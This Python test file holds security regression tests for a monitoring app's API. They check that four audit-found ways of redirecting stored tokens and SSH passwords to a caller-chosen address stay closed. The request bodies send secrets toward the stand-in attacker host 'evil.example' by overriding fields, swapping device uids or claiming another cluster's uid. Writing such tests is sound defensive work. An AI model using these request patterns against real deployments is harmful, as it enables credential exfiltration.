#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stored secrets only go where the caller may point them.

Four ways the audit found to send a stored secret — an item's token, a device's SSH password —
to an address the caller chose, each closed and kept closed:

* a read-only watchful action (open to ``modules_view``) filled the stored item's secrets and
  the named device's SSH profile into a config whose ``host`` was the client's;
* saving a module item followed its provisioning ``link_field`` into ANY device and moved that
  device's address;
* the device test endpoints gated on ``uid`` but resolved the device from ``device_uid``, and
  restored the secrets of any check key the client named;
* the cluster save authorised the cluster uid written by the client, not the one stored.

Every test drives the real routes through the test client, as a user holding exactly the
permissions the scenario names.
"""

import os
from unittest import mock

import pytest

from lib.core.constants import BUILTIN_ROLE_UIDS
from lib.modules import check_runner
from tests.conftest import _login_as as _as

_SRC = os.path.abspath(__file__).split(os.sep + 'tests' + os.sep)[0]
_TOKEN = 'PVE_TOKEN_SECRET'
_PW_A, _PW_B = 'PW_A_SECRET', 'PW_B_SECRET'


@pytest.fixture()
def env(admin):
    """Two devices with SSH passwords and a proxmox check holding a token, unbound."""
    admin._modules_dir = os.path.join(_SRC, 'watchfuls')
    ds = admin._devices_store
    a = ds.create({'name': 'A', 'address': '10.0.0.1', 'kind': 'remote',
                   'profiles': {'ssh': {'ssh_user': 'a', 'ssh_password': _PW_A}}})
    b = ds.create({'name': 'B', 'address': '10.0.0.2', 'kind': 'remote',
                   'profiles': {'ssh': {'ssh_user': 'root', 'ssh_password': _PW_B}}})
    mods = admin._load_modules() or {}
    mods['proxmox'] = {'enabled': True, 'list': {'K1': {
        'enabled': True, 'host': 'pve.local', 'auth_method': 'token',
        'token_id': 'root@pam!x', 'token_secret': _TOKEN}}}
    admin._save_modules(mods)
    return {'wa': admin, 'A': a, 'B': b}


def _run_action(client, body):
    """POST proxmox/test_connection and return the config the action was handed."""
    from watchfuls.proxmox import Watchful  # noqa: PLC0415
    seen = []

    def _rec(cls, config):
        seen.append(dict(config))
        return {'ok': True, 'message': 'captured'}

    with mock.patch.object(Watchful, 'test_connection', classmethod(_rec)):
        r = client.post('/api/v1/modules/watchfuls/proxmox/test_connection', json=body)
    assert r.status_code == 200, r.get_json()
    assert len(seen) == 1
    return seen[0]


def _ssh_of(cfg):
    return ((cfg.get('__device__') or {}).get('ssh') or {})


# ── D1: watchful actions ──────────────────────────────────────────────────────────

class TestAReadOnlyActionRunsAStoredItemAsSaved:

    def test_a_viewer_cannot_point_the_stored_token_at_another_host(self, env):
        v = _as(env['wa'], 'viewer', role=BUILTIN_ROLE_UIDS['viewer'])
        cfg = _run_action(v, {'_item_key': 'K1', 'host': 'evil.example', 'vip': 'evil.example'})
        assert cfg.get('host') == 'pve.local'
        assert cfg.get('vip') in (None, '')
        assert 'evil.example' not in repr(cfg)

    def test_a_viewer_refreshing_the_saved_item_still_authenticates(self, env):
        """The module page posts the masked item it was given; the stored token comes back."""
        v = _as(env['wa'], 'viewer2', role=BUILTIN_ROLE_UIDS['viewer'])
        cfg = _run_action(v, {'_item_key': 'K1', 'host': 'pve.local', 'auth_method': 'token',
                              'token_id': 'root@pam!x', 'token_secret': None,
                              '_lang': 'en_EN'})
        assert cfg.get('token_secret') == _TOKEN
        assert cfg.get('_lang') == 'en_EN'

    def test_a_viewer_cannot_borrow_a_device_ssh_password(self, env):
        v = _as(env['wa'], 'viewer3', role=BUILTIN_ROLE_UIDS['viewer'])
        cfg = _run_action(v, {'host': 'evil.example', 'device_uid': env['B']})
        assert _PW_B not in repr(cfg)
        cfg = _run_action(v, {'host': 'evil.example', 'device_uid': env['B'], '_device': {
            'address': 'evil.example', 'kind': 'remote',
            'profiles': {'ssh': {'ssh_user': 'root', 'ssh_password': None}}}})
        assert _PW_B not in repr(cfg)

    def test_a_viewer_cannot_borrow_a_credential(self, env):
        cuid = env['wa']._credentials_store.create(
            {'name': 'shared', 'ctype': 'ssh', 'data': {'ssh_user': 'svc',
                                                        'ssh_password': 'CRED_SECRET'}})
        assert cuid
        v = _as(env['wa'], 'viewer4', role=BUILTIN_ROLE_UIDS['viewer'])
        cfg = _run_action(v, {'host': 'evil.example', 'cred_uid': cuid})
        assert 'CRED_SECRET' not in repr(cfg)

    def test_a_module_editor_still_tests_an_unsaved_change(self, env):
        e = _as(env['wa'], 'modeditor', ['modules_view', 'module.proxmox.view',
                                         'module.proxmox.edit'])
        cfg = _run_action(e, {'_item_key': 'K1', 'host': 'pve2.local', 'token_secret': None})
        assert cfg.get('host') == 'pve2.local'
        assert cfg.get('token_secret') == _TOKEN

    def test_a_module_editor_cannot_borrow_a_device_they_cannot_edit(self, env):
        e = _as(env['wa'], 'modeditor2', ['modules_view', 'module.proxmox.edit'])
        cfg = _run_action(e, {'host': 'evil.example', 'device_uid': env['B']})
        assert _PW_B not in repr(cfg)

    def test_a_device_editor_still_tests_a_draft_of_their_device(self, env):
        """The device modal posts device_uid + a draft with masked secrets: restored."""
        e = _as(env['wa'], 'deveditor', ['modules_view', f'server.{env["A"]}.view',
                                         f'server.{env["A"]}.edit'])
        cfg = _run_action(e, {'host': '', 'device_uid': env['A'], '_device': {
            'address': '10.0.0.9', 'kind': 'remote',
            'profiles': {'ssh': {'ssh_user': 'a', 'ssh_password': None}}}})
        assert _ssh_of(cfg).get('ssh_password') == _PW_A
        assert cfg['__device__']['address'] == '10.0.0.9'


# ── D2: provisioning link field ───────────────────────────────────────────────────

class TestAProvisioningLinkOnlyMovesItsOwnDevice:

    def _save_keepalived(self, client, item):
        cur = client.get('/api/v1/modules').get_json()
        cur.setdefault('keepalived', {'enabled': True, 'list': {}})
        cur['keepalived'].setdefault('list', {})['new1'] = item
        return client.put('/api/v1/modules', json=cur)

    def test_a_module_editor_cannot_retarget_another_device(self, env):
        wa = env['wa']
        mods = wa._load_modules()
        mods['keepalived'] = {'enabled': True, 'list': {}}
        wa._save_modules(mods)
        k = _as(wa, 'kaeditor', ['modules_view', 'module.keepalived.view',
                                 'module.keepalived.edit'])
        self._save_keepalived(k, {'enabled': True, 'label': 'x', 'vip': 'evil.example',
                                  'vip_device_uid': env['B'], 'device_uids': []})
        b = wa._devices_store.get(env['B'], decrypt=True)
        assert b['address'] == '10.0.0.2'
        # The item got a device of its own instead.
        item = next(iter(wa._load_modules()['keepalived']['list'].values()))
        assert item.get('vip_device_uid') and item['vip_device_uid'] != env['B']
        assert wa._devices_store.get(item['vip_device_uid'])['address'] == 'evil.example'

    def test_moving_the_vip_still_moves_the_items_own_device(self, env):
        wa = env['wa']
        mods = wa._load_modules()
        mods['keepalived'] = {'enabled': True, 'list': {}}
        wa._save_modules(mods)
        k = _as(wa, 'kaeditor2', ['modules_view', 'module.keepalived.view',
                                  'module.keepalived.edit'])
        assert self._save_keepalived(k, {'enabled': True, 'label': 'vip1', 'vip': '10.1.1.1',
                                         'device_uids': []}).status_code == 200
        key, item = next(iter(wa._load_modules()['keepalived']['list'].items()))
        own = item['vip_device_uid']
        cur = k.get('/api/v1/modules').get_json()
        cur['keepalived']['list'][key]['vip'] = '10.1.1.2'
        assert k.put('/api/v1/modules', json=cur).status_code == 200
        assert wa._devices_store.get(own)['address'] == '10.1.1.2'

    def test_a_device_editor_may_link_a_device_they_edit(self, env):
        wa = env['wa']
        mods = wa._load_modules()
        mods['keepalived'] = {'enabled': True, 'list': {}}
        wa._save_modules(mods)
        k = _as(wa, 'kaeditor3', ['modules_view', 'module.keepalived.edit', 'devices_edit'])
        self._save_keepalived(k, {'enabled': True, 'label': 'x', 'vip': '10.0.0.20',
                                  'vip_device_uid': env['B'], 'device_uids': []})
        assert wa._devices_store.get(env['B'])['address'] == '10.0.0.20'


# ── D3: device test endpoints ─────────────────────────────────────────────────────

def _ssh_capture():
    from lib.core.devices import ssh_client  # noqa: PLC0415
    cap = []
    return cap, (mock.patch.object(ssh_client, 'test_connection',
                                   lambda **kw: (cap.append(kw), (False, 'x', ''))[1]),
                 mock.patch.object(ssh_client, 'HAS_PARAMIKO', True))


class TestTheDeviceTestGatesTheDeviceItTests:

    def test_editing_mine_does_not_test_theirs(self, env):
        e = _as(env['wa'], 'srvA', [f'server.{env["A"]}.edit', f'server.{env["A"]}.view'])
        cap, (p1, p2) = _ssh_capture()
        with p1, p2:
            r = e.post('/api/v1/devices/test', json={
                'uid': env['A'], 'device_uid': env['B'], 'checks': [],
                '_device': {'address': 'evil.example', 'kind': 'remote',
                            'profiles': {'ssh': {'ssh_user': 'root', 'ssh_password': None}}}})
        assert r.status_code == 403
        assert not any(c.get('password') == _PW_B for c in cap)

    def test_a_per_server_editor_may_test_their_device(self, env):
        """The UI sends only device_uid — that used to be refused."""
        e = _as(env['wa'], 'srvA2', [f'server.{env["A"]}.edit', f'server.{env["A"]}.view'])
        cap, (p1, p2) = _ssh_capture()
        with p1, p2:
            r = e.post('/api/v1/devices/test', json={
                'device_uid': env['A'], 'checks': [],
                '_device': {'address': '10.0.0.1', 'kind': 'remote',
                            'profiles': {'ssh': {'ssh_user': 'a', 'ssh_password': None}}}})
        assert r.status_code == 200
        assert cap and cap[0]['password'] == _PW_A

    def test_a_per_server_editor_may_test_a_check_of_their_device(self, env):
        e = _as(env['wa'], 'srvA3', [f'server.{env["A"]}.edit', f'server.{env["A"]}.view'])
        with mock.patch.object(check_runner, 'run_module_check', return_value=[]):
            r = e.post('/api/v1/devices/test_check', json={
                'device_uid': env['A'], 'module': 'ping', 'key': 'x', 'fields': {}})
        assert r.status_code == 200

    def test_another_checks_secret_is_not_restored(self, env):
        """Naming an unbound check's key does not hand its token to my device's test."""
        e = _as(env['wa'], 'srvA4', [f'server.{env["A"]}.edit', f'server.{env["A"]}.view'])
        seen = []

        def _rec(module, cfg, **_kw):
            seen.append(cfg)
            return []
        with mock.patch.object(check_runner, 'run_module_check', _rec):
            r = e.post('/api/v1/devices/test_check', json={
                'uid': env['A'], 'device_uid': env['A'], 'module': 'proxmox',
                'collection': 'list', 'key': 'K1', 'fields': {'host': 'evil.example', 'token_secret': None}})
            assert r.status_code == 200
            r = e.post('/api/v1/devices/test', json={
                'uid': env['A'], 'device_uid': env['A'], 'no_ssh': True, 'checks': [{
                    'module': 'proxmox', 'collection': 'list', 'key': 'K1',
                    'fields': {'host': 'evil.example', 'token_secret': None}}]})
            assert r.status_code == 200
        assert seen and _TOKEN not in repr(seen)

    def test_a_check_of_the_device_under_test_is_restored(self, env):
        wa = env['wa']
        mods = wa._load_modules()
        mods['proxmox']['list']['KA'] = {'enabled': True, 'host': '', 'device_uid': env['A'],
                                         'auth_method': 'token', 'token_id': 'r@pam!y',
                                         'token_secret': 'TOKEN_OF_A'}
        wa._save_modules(mods)
        e = _as(wa, 'srvA5', [f'server.{env["A"]}.edit', f'server.{env["A"]}.view'])
        seen = []

        def _rec(module, cfg, **_kw):
            seen.append(cfg)
            return []
        with mock.patch.object(check_runner, 'run_module_check', _rec):
            r = e.post('/api/v1/devices/test_check', json={
                'device_uid': env['A'], 'module': 'proxmox', 'collection': 'list',
                'key': 'KA', 'fields': {'host': '', 'token_secret': None}})
        assert r.status_code == 200
        assert 'TOKEN_OF_A' in repr(seen)


# ── D4: cluster save ──────────────────────────────────────────────────────────────

class TestAClusterEditorStaysOnTheirCluster:

    @pytest.fixture()
    def clusters(self, env):
        wa = env['wa']
        mods = wa._load_modules()
        mods['ping'] = {'enabled': True, 'list': {
            'CL_C': {'uid': 'CL_C', 'enabled': True, 'host': 'c', 'device_uids': [env['A']]},
            'CL_D': {'uid': 'CL_D', 'enabled': True, 'host': 'd', 'device_uids': [env['A']]},
            'P_B': {'uid': 'P_B', 'enabled': True, 'host': '', 'device_uid': env['B']},
        }}
        wa._save_modules(mods)
        return _as(wa, 'clC', ['modules_view', 'cluster.CL_C.edit', 'cluster.CL_C.view'])

    def _put(self, client, mutate):
        cur = client.get('/api/v1/modules').get_json()
        mutate(cur['ping']['list'])
        return client.put('/api/v1/modules', json=cur)

    def test_they_may_edit_their_cluster(self, env, clusters):
        r = self._put(clusters, lambda L: L['CL_C'].update(host='c2'))
        assert r.status_code == 200

    def test_another_cluster_is_not_theirs_by_claiming_its_uid(self, env, clusters):
        r = self._put(clusters, lambda L: L['CL_D'].update(uid='CL_C', host='evil'))
        assert r.status_code == 403
        assert env['wa']._load_modules()['ping']['list']['CL_D']['host'] == 'd'

    def test_a_device_check_cannot_become_their_cluster_item(self, env, clusters):
        def _m(L):
            L['P_B'].update(uid='CL_C', device_uids=[env['A']])
            L['P_B'].pop('device_uid', None)
        r = self._put(clusters, _m)
        assert r.status_code == 403
        assert env['wa']._load_modules()['ping']['list']['P_B'].get('device_uid') == env['B']

    def test_their_cluster_cannot_be_pinned_to_a_device(self, env, clusters):
        r = self._put(clusters, lambda L: L['CL_C'].update(device_uid=env['B']))
        assert r.status_code == 403
